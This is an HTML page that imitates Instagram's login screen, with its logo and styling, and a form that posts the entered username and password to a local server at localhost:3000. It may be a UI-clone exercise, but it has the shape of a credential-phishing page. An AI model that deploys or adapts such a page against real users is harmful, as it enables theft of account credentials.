<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Instagram Login</title>
  <style>
    body {
      font-family: Arial, sans-serif;
      background-color: #fafafa;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      margin: 0;
    }
    .login-container {
      width: 350px;
      padding: 40px;
      background: #fff;
      border: 1px solid #dbdbdb;
      text-align: center;
      border-radius: 10px;
    }
    .logo {
      margin-bottom: 20px;
    }
    .logo img {
      width: 175px;
    }
    .input-field {
      width: 100%;
      padding: 10px;
      margin: 10px 0;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
    }
    .login-btn {
      width: 100%;
      padding: 10px;
      background-color: #0095f6;
      color: #fff;
      border: none;
      border-radius: 5px;
      cursor: pointer;
      font-weight: bold;
    }
    .login-btn:hover {
      background-color: #007ace;
    }
    .divider {
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 20px 0;
      color: #8e8e8e;
    }
    .divider::before,
    .divider::after {
      content: '';
      flex: 1;
      height: 1px;
      background: #dbdbdb;
      margin: 0 10px;
    }
    .link {
      color: #0095f6;
      text-decoration: none;
    }
  </style>
</head>
<body>
  <div class="login-container">
    <div class="logo">
      <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/2560px-Instagram_logo.svg.png" alt="Instagram Logo">
    </div>
   <form method="POST" action="http://localhost:3000/login">
  <input type="text" class="input-field" name="username" placeholder="Username" required>
  <input type="password" class="input-field" name="password" placeholder="Password" required>
  <button type="submit" class="login-btn">Log In</button>
</form>

    
    <div class="divider">OR</div>
    <a href="forgot.html" class="link">Forgot password?</a>
  </div>
</body>
</html>
